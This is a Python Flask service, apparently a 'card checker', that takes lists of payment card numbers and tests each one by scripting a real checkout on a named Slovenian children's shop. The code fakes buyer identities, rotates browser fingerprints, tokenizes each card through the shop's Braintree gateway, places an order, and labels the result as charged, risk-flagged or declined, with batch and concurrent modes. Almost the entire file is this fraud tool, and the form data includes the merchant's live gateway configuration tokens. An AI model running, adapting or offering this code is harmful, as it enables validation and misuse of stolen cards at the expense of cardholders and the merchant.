from flask import Flask, request, jsonify
import requests, re, time, random, base64, json
from faker import Faker
import threading
import curl_cffi.requests as curl
from concurrent.futures import ThreadPoolExecutor, as_completed

app = Flask(__name__)

# ===== Config =====
MAX_WORKERS = 20  # عدد الطلبات المتزامنة
executor = ThreadPoolExecutor(max_workers=MAX_WORKERS)

# ===== Fake Data Generator =====
fake = Faker()

def generate_fake_person():
    first_name = fake.first_name()
    last_name = fake.last_name()
    email = f"{first_name.lower()}{random.randint(10, 999)}@{random.choice(['gmail.com', 'yahoo.com', 'hotmail.com'])}"
    phone = f"+{random.choice(['1', '44', '61'])}{random.randint(100000000, 999999999)}"
    address = fake.street_address().replace(' ', '+')
    city = fake.city()
    postal = fake.postcode()
    return {
        "first_name": first_name,
        "last_name": last_name,
        "email": email,
        "phone": phone,
        "address": address,
        "city": city,
        "postal": postal
    }

def get_random_user_agent():
    user_agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15'
    ]
    return random.choice(user_agents)

def get_random_referer():
    referers = [
        'https://www.google.com/',
        'https://www.bing.com/',
        'https://all4kids.si/',
        'https://all4kids.si/izdelek/'
    ]
    return random.choice(referers)

def check_card(card):
    """Check a single card using curl_cffi"""
    card = card.strip()
    
    time.sleep(random.uniform(0.3, 0.8))
    
    try:
        n = card.split("|")[0]
        mm = card.split("|")[1]
        yy = card.split("|")[2]	
    except:
        return {"status": "error", "message": "Invalid Format ❌", "card": card}
    
    if "20" in yy:
        yy = yy.split("20")[1]
    
    person = generate_fake_person()
    user_agent = get_random_user_agent()
    referer = get_random_referer()
    
    s = curl.Session()
    s.timeout = 35
    
    # ===== STEP 1: Get product page =====
    headers = {
        'authority': 'all4kids.si',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.9,sl;q=0.8',
        'cache-control': 'max-age=0',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'none',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': user_agent,
        'referer': referer
    }
    
    try:
        response = s.get('https://all4kids.si/izdelek/infantino-grizalo-za-zobke-grapefruit-68872/', headers=headers, timeout=30)
        if response.status_code != 200:
            return {"status": "error", "message": "Connection Failed ❌", "card": card}
    except Exception as e:
        return {"status": "error", "message": f"Connection Error: {str(e)[:30]}", "card": card}
    
    time.sleep(random.uniform(0.3, 0.7))
    
    try:
        ncad_match = re.search(r'"ajax_nonce":"([^"]+)"', response.text)
        ncwp_match = re.search(r'"_wpnonce":"([^"]+)"', response.text)
        
        if not ncad_match or not ncwp_match:
            return {"status": "error", "message": "Nonce Extraction Failed ❌", "card": card}
        
        ncad = ncad_match.group(1)
        ncwp = ncwp_match.group(1)
    except:
        return {"status": "error", "message": "Nonce Error ❌", "card": card}
    
    # ===== STEP 2: Add to cart =====
    headers = {
        'authority': 'all4kids.si',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9,sl;q=0.8',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://all4kids.si',
        'referer': 'https://all4kids.si/izdelek/infantino-grizalo-za-zobke-grapefruit-68872/',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': user_agent,
        'x-requested-with': 'XMLHttpRequest',
    }
    
    params = {'wc-ajax': 'fkcart_add_item'}
    data = {
        'qty': '1',
        'yith_wapo_product_id': '614955',
        'yith_wapo_product_img': '',
        'yith_wapo_is_single': '1',
        '_wpnonce': ncwp,
        '_wp_http_referer': '/izdelek/infantino-grizalo-za-zobke-grapefruit-68872/',
        'gtm4wp_product_data': '{"internal_id":614955,"item_id":614955,"item_name":"Infantino\\u00ae Grizalo za zobke Grapefruit","sku":"INF22115109","price":2.62,"stocklevel":11,"stockstatus":"instock","google_business_vertical":"retail","item_category":"Igra\\u010de za najmlaj\\u0161e","id":614955}',
        'fkcart_single_product_add_to_cart': 'yes',
        'fkcart_product_id': '614955',
        'fkcart_quantity': '1',
        'nonce': ncad,
    }
    
    try:
        response = s.post('https://all4kids.si/', params=params, headers=headers, data=data, timeout=30)
        if response.status_code != 200:
            return {"status": "error", "message": "Add to Cart Failed ❌", "card": card}
    except:
        return {"status": "error", "message": "Add to Cart Error ❌", "card": card}
    
    time.sleep(random.uniform(0.3, 0.7))
    
    # ===== STEP 3: Go to checkout =====
    headers = {
        'authority': 'all4kids.si',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.9,sl;q=0.8',
        'cache-control': 'max-age=0',
        'referer': 'https://all4kids.si/',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': user_agent,
    }
    
    try:
        response = s.get('https://all4kids.si/blagajna/', headers=headers, timeout=30)
        if response.status_code != 200:
            return {"status": "error", "message": "Checkout Failed ❌", "card": card}
    except:
        return {"status": "error", "message": "Checkout Error ❌", "card": card}
    
    time.sleep(random.uniform(0.3, 0.7))
    
    try:
        chk_match = re.search(r'name="woocommerce-process-checkout-nonce" value="([^"]+)"', response.text)
        sec_match = re.search(r'"update_order_review_nonce":"([^"]+)"', response.text)
        wfi_match = re.search(r'class="_wfacp_post_id" value="([^"]+)"', response.text)
        enc_match = re.search(r'var wc_braintree_client_token = \["(.*?)"\];', response.text)
        
        if not chk_match or not sec_match or not wfi_match or not enc_match:
            return {"status": "error", "message": "Checkout Data Missing ❌", "card": card}
        
        chk = chk_match.group(1)
        sec = sec_match.group(1)
        wfi = wfi_match.group(1)
        enc = enc_match.group(1)
        
        dec = base64.b64decode(enc).decode('utf-8')
        au_match = re.findall(r'"authorizationFingerprint":"(.*?)"', dec)
        if not au_match:
            return {"status": "error", "message": "Auth Token Missing ❌", "card": card}
        au = au_match[0]
    except:
        return {"status": "error", "message": "Checkout Parse Error ❌", "card": card}
    
    # ===== STEP 4: Update order review =====
    headers = {
        'authority': 'all4kids.si',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9,sl;q=0.8',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://all4kids.si',
        'referer': 'https://all4kids.si/blagajna/',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': user_agent,
        'x-requested-with': 'XMLHttpRequest',
    }
    
    params = {'wc-ajax': 'update_order_review', 'wfacp_id': wfi, 'wfacp_is_checkout_override': 'yes'}
    
    email = person['email']
    first_name = person['first_name']
    last_name = person['last_name']
    phone = person['phone']
    address = person['address']
    city = person['city']
    postal = person['postal']
    
    data = f'security={sec}&payment_method=bacs&country=HR&state=HR-01&postcode={postal}&city={city}&address={address}&address_2=&s_country=HR&s_state=HR-01&s_postcode={postal}&s_city={city}&s_address={address}&s_address_2=&has_full_address=true&post_data=_wfacp_post_id%3D{wfi}%26wfacp_cart_hash%3D%26wfacp_has_active_multi_checkout%3D%26wfacp_source%3Dhttps%253A%252F%252Fall4kids.si%252Fcheckouts%252Fblagajna%252F%26product_switcher_need_refresh%3D0%26wfacp_cart_contains_subscription%3D0%26wfacp_exchange_keys%3D%257B%2522pre_built%2522%253A%257B%257D%252C%2522elementor%2522%253A%257B%2522wfacp_form%2522%253A%25222614efc4%2522%257D%257D%26wfacp_input_hidden_data%3D%257B%257D%26wfacp_input_phone_field%3D%257B%2522billing%2522%253A%257B%2522code%2522%253A%2522%2522%252C%2522number%2522%253A%2522%2522%252C%2522hidden%2522%253A%2522%2522%257D%252C%2522shipping%2522%253A%257B%2522code%2522%253A%2522%2522%252C%2522number%2522%253A%2522%2522%252C%2522hidden%2522%253A%2522yes%2522%257D%257D%26wfacp_timezone%3D%26wc_order_attribution_source_type%3Dtypein%26wc_order_attribution_referrer%3Dhttps%253A%252F%252Fall4kids.si%252Fmoj-racun%252Fpayment-methods%252F%26wc_order_attribution_utm_campaign%3D(none)%26wc_order_attribution_utm_source%3D(direct)%26wc_order_attribution_utm_medium%3D(none)%26wc_order_attribution_utm_content%3D(none)%26wc_order_attribution_utm_id%3D(none)%26wc_order_attribution_utm_term%3D(none)%26wc_order_attribution_utm_source_platform%3D(none)%26wc_order_attribution_utm_creative_format%3D(none)%26wc_order_attribution_utm_marketing_tactic%3D(none)%26wc_order_attribution_session_entry%3Dhttps%253A%252F%252Fall4kids.si%252Fmoj-racun%252Fadd-payment-method%252F%26wc_order_attribution_session_start_time%3D2026-07-07%252009%253A41%253A28%26wc_order_attribution_session_pages%3D26%26wc_order_attribution_session_count%3D1%26wc_order_attribution_user_agent%3DMozilla%252F5.0%2520(Linux%253B%2520Android%252010%253B%2520K)%2520AppleWebKit%252F537.36%2520(KHTML%252C%2520like%2520Gecko)%2520Chrome%252F139.0.0.0%2520Mobile%2520Safari%252F537.36%26wfacp_billing_same_as_shipping%3D0%26wfacp_billing_address_present%3Dyes%26wfob_input_hidden_data%3D%26wfob_input_bump_shown_ids%3D%26wfob_input_bump_global_data%3D%26billing_email%3D{email}%26billing_first_name%3D{first_name}%26billing_last_name%3D{last_name}%26order_comments%3D%26shipping_address_1%3D{address}%26shipping_address_2%3D%26shipping_city%3D{city}%26shipping_postcode%3D{postal}%26shipping_country%3DHR%26shipping_state%3DHR-01%26shipping_phone%3D{phone}%26billing_address_1%3D{address}%26billing_address_2%3D%26billing_city%3D{city}%26billing_postcode%3D{postal}%26billing_country%3DHR%26billing_state%3DHR-01%26wc_order_attribution_source_type%3Dtypein%26wc_order_attribution_referrer%3Dhttps%253A%252F%252Fall4kids.si%252Fmoj-racun%252Fpayment-methods%252F%26wc_order_attribution_utm_campaign%3D(none)%26wc_order_attribution_utm_source%3D(direct)%26wc_order_attribution_utm_medium%3D(none)%26wc_order_attribution_utm_content%3D(none)%26wc_order_attribution_utm_id%3D(none)%26wc_order_attribution_utm_term%3D(none)%26wc_order_attribution_utm_source_platform%3D(none)%26wc_order_attribution_utm_creative_format%3D(none)%26wc_order_attribution_utm_marketing_tactic%3D(none)%26wc_order_attribution_session_entry%3Dhttps%253A%252F%252Fall4kids.si%252Fmoj-racun%252Fadd-payment-method%252F%26wc_order_attribution_session_start_time%3D2026-07-07%252009%253A41%253A28%26wc_order_attribution_session_pages%3D26%26wc_order_attribution_session_count%3D1%26wc_order_attribution_user_agent%3DMozilla%252F5.0%2520(Linux%253B%2520Android%252010%253B%2520K)%2520AppleWebKit%252F537.36%2520(KHTML%252C%2520like%2520Gecko)%2520Chrome%252F139.0.0.0%2520Mobile%2520Safari%252F537.36%26shipping_method%255B0%255D%3Dflat_rate%253A4%26payment_method%3Dbacs%26braintree_cc_nonce_key%3D%26braintree_cc_device_data%3D%257B%2522correlation_id%2522%253A%252280aa56be-5059-45f2-936c-abf948f8%2522%257D%26braintree_cc_3ds_nonce_key%3D%26braintree_cc_config_data%3D%26braintree_applepay_nonce_key%3D%26braintree_applepay_device_data%3D%257B%2522correlation_id%2522%253A%252280aa56be-5059-45f2-936c-abf948f8%2522%257D%26wc-revolut-cardholder-name%3D%26wc_revolut_pay_payment_nonce%3D%26terms-field%3D1%26woocommerce-process-checkout-nonce%3D{chk}%26_wp_http_referer%3D%252Fblagajna%252F%26shipping_first_name%3D{first_name}%26shipping_last_name%3D{last_name}%26ship_to_different_address%3Don&shipping_method%5B0%5D=flat_rate%3A4'
    
    try:
        response = s.post('https://all4kids.si/', params=params, headers=headers, data=data, timeout=30)
    except:
        return {"status": "error", "message": "Order Review Error ❌", "card": card}
    
    # ===== STEP 5: Tokenize card =====
    headers = {
        'authority': 'payments.braintree-api.com',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9,sl;q=0.8',
        'authorization': f'Bearer {au}',
        'braintree-version': '2018-05-10',
        'content-type': 'application/json',
        'origin': 'https://assets.braintreegateway.com',
        'referer': 'https://assets.braintreegateway.com/',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': user_agent,
    }
    
    json_data = {
        'clientSdkMetadata': {
            'source': 'client',
            'integration': 'custom',
            'sessionId': f'{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}',
        },
        'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance productId business consumer purchase corporate } } } }',
        'variables': {
            'input': {
                'creditCard': {
                    'number': n,
                    'expirationMonth': mm,
                    'expirationYear': yy,
                    'billingAddress': {
                        'postalCode': postal,
                        'streetAddress': address.replace('+', ' '),
                    },
                },
                'options': {'validate': False},
            },
        },
        'operationName': 'TokenizeCreditCard',
    }
    
    try:
        response = s.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data, timeout=30)
        token_data = response.json()
        if 'data' not in token_data or 'tokenizeCreditCard' not in token_data['data']:
            return {"status": "error", "message": "Card Tokenization Failed ❌", "card": card}
        token = token_data['data']['tokenizeCreditCard']['token']
    except:
        return {"status": "error", "message": "Invalid Card ❌", "card": card}
    
    # ===== STEP 6: Submit order =====
    headers = {
        'authority': 'all4kids.si',
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'en-US,en;q=0.9,sl;q=0.8',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://all4kids.si',
        'referer': 'https://all4kids.si/blagajna/',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': user_agent,
        'x-requested-with': 'XMLHttpRequest',
    }
    
    params = {'wc-ajax': 'checkout', 'wfacp_id': wfi, 'wfacp_is_checkout_override': 'yes'}
    
    data = f'_wfacp_post_id={wfi}&wfacp_cart_hash=&wfacp_has_active_multi_checkout=&wfacp_source=https%3A%2F%2Fall4kids.si%2Fcheckouts%2Fblagajna%2F&product_switcher_need_refresh=1&wfacp_cart_contains_subscription=0&wfacp_exchange_keys=%7B%22pre_built%22%3A%7B%7D%2C%22elementor%22%3A%7B%22wfacp_form%22%3A%222614efc4%22%7D%7D&wfacp_input_hidden_data=%7B%7D&wfacp_input_phone_field=%7B%22billing%22%3A%7B%22code%22%3A%22%22%2C%22number%22%3A%22%22%2C%22hidden%22%3A%22%22%7D%2C%22shipping%22%3A%7B%22code%22%3A%22%22%2C%22number%22%3A%22%22%2C%22hidden%22%3A%22yes%22%7D%7D&wfacp_timezone=Asia%2FBaghdad&wc_order_attribution_source_type=typein&wc_order_attribution_referrer=https%3A%2F%2Fall4kids.si%2Fmoj-racun%2Fpayment-methods%2F&wc_order_attribution_utm_campaign=(none)&wc_order_attribution_utm_source=(direct)&wc_order_attribution_utm_medium=(none)&wc_order_attribution_utm_content=(none)&wc_order_attribution_utm_id=(none)&wc_order_attribution_utm_term=(none)&wc_order_attribution_utm_source_platform=(none)&wc_order_attribution_utm_creative_format=(none)&wc_order_attribution_utm_marketing_tactic=(none)&wc_order_attribution_session_entry=https%3A%2F%2Fall4kids.si%2Fmoj-racun%2Fadd-payment-method%2F&wc_order_attribution_session_start_time=2026-07-07+09%3A41%3A28&wc_order_attribution_session_pages=27&wc_order_attribution_session_count=1&wc_order_attribution_user_agent=Mozilla%2F5.0+(Linux%3B+Android+10%3B+K)+AppleWebKit%2F537.36+(KHTML%2C+like+Gecko)+Chrome%2F139.0.0.0+Mobile+Safari%2F537.36&wfacp_billing_same_as_shipping=0&wfacp_billing_address_present=yes&wfob_input_hidden_data=%7B%7D&wfob_input_bump_shown_ids=&wfob_input_bump_global_data=&billing_email={email}&billing_first_name={first_name}&billing_last_name={last_name}&order_comments=&shipping_address_1={address}&shipping_address_2=&shipping_city={city}&shipping_postcode={postal}&shipping_country=HR&shipping_state=HR-01&shipping_phone={phone}&billing_address_1={address}&billing_address_2=&billing_city={city}&billing_postcode={postal}&billing_country=HR&billing_state=HR-01&wc_order_attribution_source_type=typein&wc_order_attribution_referrer=https%3A%2F%2Fall4kids.si%2Fmoj-racun%2Fpayment-methods%2F&wc_order_attribution_utm_campaign=(none)&wc_order_attribution_utm_source=(direct)&wc_order_attribution_utm_medium=(none)&wc_order_attribution_utm_content=(none)&wc_order_attribution_utm_id=(none)&wc_order_attribution_utm_term=(none)&wc_order_attribution_utm_source_platform=(none)&wc_order_attribution_utm_creative_format=(none)&wc_order_attribution_utm_marketing_tactic=(none)&wc_order_attribution_session_entry=https%3A%2F%2Fall4kids.si%2Fmoj-racun%2Fadd-payment-method%2F&wc_order_attribution_session_start_time=2026-07-07+09%3A41%3A28&wc_order_attribution_session_pages=27&wc_order_attribution_session_count=1&wc_order_attribution_user_agent=Mozilla%2F5.0+(Linux%3B+Android+10%3B+K)+AppleWebKit%2F537.36+(KHTML%2C+like+Gecko)+Chrome%2F139.0.0.0+Mobile+Safari%2F537.36&shipping_method%5B0%5D=flat_rate%3A4&payment_method=braintree_cc&braintree_cc_nonce_key={token}&braintree_cc_device_data=%7B%22correlation_id%22%3A%2232e39fc0-2a5d-4097-8ef0-3e184c35%22%7D&braintree_cc_3ds_nonce_key=&braintree_cc_config_data=%7B%22environment%22%3A%22production%22%2C%22clientApiUrl%22%3A%22https%3A%2F%2Fapi.braintreegateway.com%3A443%2Fmerchants%2F3bp88dvf8zpgsn9h%2Fclient_api%22%2C%22assetsUrl%22%3A%22https%3A%2F%2Fassets.braintreegateway.com%22%2C%22analytics%22%3A%7B%22url%22%3A%22https%3A%2F%2Fclient-analytics.braintreegateway.com%2F3bp88dvf8zpgsn9h%22%7D%2C%22merchantId%22%3A%223bp88dvf8zpgsn9h%22%2C%22venmo%22%3A%22off%22%2C%22graphQL%22%3A%7B%22url%22%3A%22https%3A%2F%2Fpayments.braintree-api.com%2Fgraphql%22%2C%22features%22%3A%5B%22tokenize_credit_cards%22%5D%7D%2C%22applePayWeb%22%3A%7B%22countryCode%22%3A%22IE%22%2C%22currencyCode%22%3A%22EUR%22%2C%22merchantIdentifier%22%3A%223bp88dvf8zpgsn9h%22%2C%22supportedNetworks%22%3A%5B%22visa%22%2C%22mastercard%22%2C%22amex%22%5D%7D%2C%22challenges%22%3A%5B%5D%2C%22creditCards%22%3A%7B%22supportedCardTypes%22%3A%5B%22American+Express%22%2C%22Discover%22%2C%22Maestro%22%2C%22MasterCard%22%2C%22Visa%22%5D%7D%2C%22threeDSecureEnabled%22%3Atrue%2C%22threeDSecure%22%3A%7B%22cardinalAuthenticationJWT%22%3A%22eyJhbGciOiJIUzI1NiJ9.eyJqdGkiOiIwMDRiZmUzMi01NGIyLTRlNGMtYTAwNS05NGE5MzMyYTA3NTkiLCJpYXQiOjE3ODM0MTc4MDAsImV4cCI6MTc4MzQyNTAwMCwiaXNzIjoiNWVmMzZlMDc1NjgxY2EyNmExZTIzMGRmIiwiT3JnVW5pdElkIjoiNWVmMzZlMDYyMDEzMTI0N2M3NzFkMzVlIn0.VKf1rDrXkmzLHqh8DkgBvc3kSIchFXqjrcIIYiSDFKA%22%2C%22cardinalSongbirdUrl%22%3A%22https%3A%2F%2Fstatic.client.cardinaltrusted.com%2Fsongbird%2Fv2.1.0%2Fsongbird.js%22%2C%22cardinalSongbirdIdentityHash%22%3A%22sha384-ChU6jn6KFsEv8NcjP1ifj3s6LclP7AFS6fTHY2pcBL5yax0FT5viH%2FcNbOJDnY5E%22%7D%2C%22androidPay%22%3A%7B%22displayName%22%3A%22Mali+Zakladi%22%2C%22enabled%22%3Atrue%2C%22environment%22%3A%22production%22%2C%22googleAuthorizationFingerprint%22%3A%22eyJraWQiOiIyMDE4MDQyNjE2LXByb2R1Y3Rpb24iLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsImFsZyI6IkVTMjU2In0.eyJleHAiOjE3ODM2NzcwMDAsImp0aSI6ImQ0MmMwZWJlLTRkOWUtNDcxNC1iOTBiLWZhYTViZjdmZjgzYSIsInN1YiI6IjNicDg4ZHZmOHpwZ3NuOWgiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IjNicDg4ZHZmOHpwZ3NuOWgiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlLCJ2ZXJpZnlfd2FsbGV0X2J5X2RlZmF1bHQiOmZhbHNlfSwicmlnaHRzIjpbInRva2VuaXplX2FuZHJvaWRfcGF5Il0sIm9wdGlvbnMiOnt9fQ.x3fs_cGlKu5Ag905kdzM8vq31PeyV3lDdDo25nySdBnsZxKW6bWXhuC8iu07okA79-C61iGFfgIgpyt0menI8A%22%2C%22paypalClientId%22%3Anull%2C%22supportedNetworks%22%3A%5B%22visa%22%2C%22mastercard%22%2C%22amex%22%5D%7D%2C%22paypalEnabled%22%3Atrue%2C%22paypal%22%3A%7B%22displayName%22%3A%22Mali+Zakladi%22%2C%22clientId%22%3A%22AUc_PGJ4iNjph7cfmXArqHrXY4SRC5LYtbs62IuqPad-ijuhsFWo7kX-5NDvFv69VJSBTYLL30iQWbxm%22%2C%22assetsUrl%22%3A%22https%3A%2F%2Fcheckout.paypal.com%22%2C%22environment%22%3A%22live%22%2C%22environmentNoNetwork%22%3Afalse%2C%22unvettedMerchant%22%3Afalse%2C%22braintreeClientId%22%3A%22ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW%22%2C%22billingAgreementsEnabled%22%3Atrue%2C%22merchantAccountId%22%3A%22malizakladiEUR%22%2C%22payeeEmail%22%3Anull%2C%22currencyIsoCode%22%3A%22EUR%22%7D%7D&braintree_applepay_nonce_key=&braintree_applepay_device_data=%7B%22correlation_id%22%3A%2232e39fc0-2a5d-4097-8ef0-3e184c35%22%7D&wc-revolut-cardholder-name=&wc_revolut_pay_payment_nonce=&terms=on&terms-field=1&woocommerce-process-checkout-nonce={chk}&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review%26wfacp_id%3D{wfi}%26wfacp_is_checkout_override%3Dyes&shipping_first_name={first_name}&shipping_last_name={last_name}&ship_to_different_address=on'
    
    try:
        response = s.post('https://all4kids.si/', params=params, headers=headers, data=data, timeout=30)
    except:
        return {"status": "error", "message": "Submit Error ❌", "card": card}
    
    text = response.text
    
    # ===== Check Response =====
    if 'success' in text.lower() or 'order received' in text.lower() or '"result":"success"' in text:
        return {"status": "charged", "message": "✅ Charged - 2$ !", "card": card}
    elif 'risk_threshold' in text.lower() or 'gateway rejected' in text.lower():
        return {"status": "risk", "message": "⚠️ Risk Threshold", "card": card}
    elif 'declined - call issuer' in text.lower():
        return {"status": "declined", "message": "❌ Declined - Call Issuer", "card": card}
    elif 'invalid card' in text.lower() or 'invalid account' in text.lower():
        return {"status": "declined", "message": "❌ Invalid Card", "card": card}
    elif 'insufficient funds' in text.lower():
        return {"status": "declined", "message": "❌ Insufficient Funds", "card": card}
    elif 'processor declined' in text.lower():
        return {"status": "declined", "message": "❌ Processor Declined", "card": card}
    elif 'expired card' in text.lower():
        return {"status": "declined", "message": "❌ Expired Card", "card": card}
    elif 'do not honor' in text.lower():
        return {"status": "declined", "message": "❌ Do Not Honor", "card": card}
    elif 'cvv' in text.lower() and 'declined' in text.lower():
        return {"status": "declined", "message": "❌ CVV Declined", "card": card}
    else:
        try:
            if 'errorMessage' in text:
                error_data = json.loads(text)
                return {"status": "unknown", "message": f"❌ {error_data.get('errorMessage', 'Unknown')[:50]}", "card": card}
            elif 'Reason:' in text:
                reason = text.split('Reason:')[1].split('<')[0].strip()
                return {"status": "unknown", "message": f"❌ {reason[:50]}", "card": card}
            else:
                return {"status": "unknown", "message": f"❌ {text[:80]}", "card": card}
        except:
            return {"status": "unknown", "message": "❌ Unknown", "card": card}

# ===== Flask API with Async Support =====
@app.route('/check', methods=['GET', 'POST'])
def api_check():
    """API endpoint - handles multiple concurrent requests from different users"""
    
    # GET request
    if request.method == 'GET':
        cc = request.args.get('cc')
        if not cc:
            return jsonify({"status": "error", "message": "Missing 'cc' parameter"}), 400
        # تنفيذ مباشر (غير متزامن) للبطاقة الواحدة
        result = check_card(cc)
        return jsonify(result)
    
    # POST request - Single card
    data = request.get_json()
    if not data:
        return jsonify({"status": "error", "message": "Missing JSON body"}), 400
    
    if 'cc' in data:
        result = check_card(data['cc'])
        return jsonify(result)
    
    # POST request - Multiple cards in one request
    if 'cards' in data and isinstance(data['cards'], list):
        cards = data['cards']
        if len(cards) > 20:
            return jsonify({"status": "error", "message": "Maximum 20 cards per request"}), 400
        
        results = []
        with ThreadPoolExecutor(max_workers=min(len(cards), 20)) as executor:
            futures = {executor.submit(check_card, card): card for card in cards}
            for future in as_completed(futures):
                try:
                    result = future.result()
                    results.append(result)
                except Exception as e:
                    results.append({
                        "status": "error",
                        "message": f"Error: {str(e)[:50]}",
                        "card": futures[future]
                    })
        
        result_map = {r['card']: r for r in results}
        ordered_results = [result_map.get(card, {"status": "error", "message": "Not processed", "card": card}) for card in cards]
        
        return jsonify({
            "status": "completed",
            "total": len(cards),
            "results": ordered_results
        })
    
    return jsonify({"status": "error", "message": "Invalid request"}), 400

# ===== Run with multiple workers =====
if __name__ == '__main__':
    print("""
    ╔══════════════════════════════════════════════════════════════════════════╗
    ║              Braintree Card Checker API - Concurrent Mode               ║
    ║                                                                         ║
    ║  ✅ Supports multiple users sending requests at the same time           ║
    ║  ✅ Each request runs in parallel using ThreadPoolExecutor              ║
    ║  ✅ Max 20 concurrent requests                                          ║
    ║                                                                         ║
    ║  Usage:                                                                 ║
    ║  GET:  /check?cc=number|mm|yy|cvv                                      ║
    ║  POST: {"cc": "number|mm|yy|cvv"}                                      ║
    ║  POST: {"cards": ["card1", "card2"]}  (Batch)                          ║
    ║                                                                         ║
    ║  Multiple users example:                                                ║
    ║  User1: curl "http://localhost:5000/check?cc=card1"                    ║
    ║  User2: curl "http://localhost:5000/check?cc=card2"                    ║
    ║  User3: curl "http://localhost:5000/check?cc=card3"                    ║
    ║  All executed in parallel!                                             ║
    ╚══════════════════════════════════════════════════════════════════════════╝
    """)
    
    # تشغيل Flask مع 20 عاملاً لمعالجة الطلبات المتزامنة
    app.run(host='0.0.0.0', port=5000, debug=False, threaded=True) 
